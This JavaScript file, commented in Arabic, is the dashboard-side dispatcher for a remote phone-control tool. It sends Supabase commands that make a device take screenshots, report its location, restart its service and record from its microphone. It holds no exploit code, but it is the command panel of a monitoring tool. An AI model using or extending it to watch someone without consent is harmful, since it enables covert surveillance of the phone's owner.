/**
 * command_dispatcher.js — Remote Command Dispatcher & Quick Action Triggers
 * ─────────────────────────────────────────────────────────────────────────────
 * ميزة الأوامر السريعة (remote_actions):
 * إرسال الأوامر السحابية الفورية إلى جدول commands، معالجة الردود،
 * وتنفيذ محفزات شريط الإجراءات السريعة (التقاط، موقع، تشغيل، وميكروفون).
 */

'use strict';

/**
 * إرسال أمر سحابي إلى الجهاز النشط عبر Supabase
 */
async function sendCommand(command, payload = {}, targetDeviceId = null) {
    const deviceId = targetDeviceId || window.currentDeviceId || (typeof currentDeviceId !== 'undefined' ? currentDeviceId : null);

    if (!deviceId) {
        if (typeof showNotif === 'function') {
            showNotif('⚠️ اختر جهازاً أولاً', 'warn');
        }
        return false;
    }

    const client = window.db || (typeof db !== 'undefined' ? db : null);
    if (!client) {
        if (typeof showNotif === 'function') {
            showNotif('❌ عميل السحابة غير متوفر', 'error');
        }
        return false;
    }

    try {
        const { error } = await client.from('commands').insert({
            device_id: deviceId,
            command: command,
            status: 'PENDING',
            payload: payload
        });

        if (error) throw error;

        if (typeof showNotif === 'function') {
            showNotif(`⚡ تم إرسال أمر [${command}] بنجاح`, 'success');
        }
        return true;

    } catch (e) {
        let errorMsg = e.message || 'خطأ غير معروف';
        if (errorMsg.includes('payload') && errorMsg.includes('exist')) {
            errorMsg = 'لم يتم تحديث جدول الأوامر بالسحابة ليدعم عمود payload.';
        }

        console.error('[sendCommand] Error:', e);
        if (typeof showNotif === 'function') {
            showNotif(`❌ فشل إرسال الأمر: ${errorMsg}`, 'error');
        }
        return false;
    }
}

/**
 * التقاط لقطة شاشة فورية عن بُعد
 */
async function triggerCapture() {
    return sendCommand('CAPTURE');
}

/**
 * طلب تحديد وتحديث الموقع الجغرافي فورياً
 */
async function triggerLocate() {
    return sendCommand('LOCATE');
}

/**
 * إعادة تشغيل الخدمة عن بُعد (Feature 6: Remote Restart via ServiceRestartReceiver)
 */
async function triggerRestartService() {
    if (!confirm('هل أنت متأكد من إعادة تشغيل الخدمة في الهاتف عن بُعد؟')) return;
    return sendCommand('RESTART');
}

/**
 * تشغيل تسجيل الميكروفون السريع
 */
async function triggerMic(action = null) {
    if (action === 'START' || !action) {
        if (typeof triggerRecordNow === 'function') {
            return triggerRecordNow();
        }
        return sendCommand('RECORD_AUDIO');
    } else if (action === 'STOP') {
        return sendCommand('CANCEL_RECORDING');
    }
}

/**
 * مسح وتنظيف الأوامر المعلقة في السحابة للجهاز الحالي
 */
async function clearPendingCommands() {
    const deviceId = window.currentDeviceId || (typeof currentDeviceId !== 'undefined' ? currentDeviceId : null);
    if (!deviceId) {
        if (typeof showNotif === 'function') showNotif('⚠️ اختر جهازاً أولاً', 'warn');
        return;
    }

    const client = window.db || (typeof db !== 'undefined' ? db : null);
    if (!client) return;

    try {
        const { error } = await client.from('commands')
            .delete()
            .eq('device_id', deviceId)
            .eq('status', 'PENDING');

        if (error) throw error;

        if (typeof showNotif === 'function') {
            showNotif('🗑️ تم مسح الأوامر المعلقة', 'info');
        }

        // تحديث عداد الأوامر المعلقة
        const { count } = await client.from('commands').select('*', { count: 'exact', head: true }).eq('status', 'PENDING');
        const st = document.getElementById('stat-pending');
        if (st) st.innerText = count || 0;

    } catch (e) {
        console.error('[clearPendingCommands] Error:', e);
        if (typeof showNotif === 'function') {
            showNotif('❌ فشل مسح الأوامر: ' + e.message, 'error');
        }
    }
}

// تصدير الدوال للنافذة العامة
window.sendCommand = sendCommand;
window.triggerCapture = triggerCapture;
window.triggerLocate = triggerLocate;
window.triggerRestartService = triggerRestartService;
window.triggerMic = triggerMic;
window.clearPendingCommands = clearPendingCommands;

console.log('✅ [Feature/RemoteActions] Command Dispatcher Initialized');
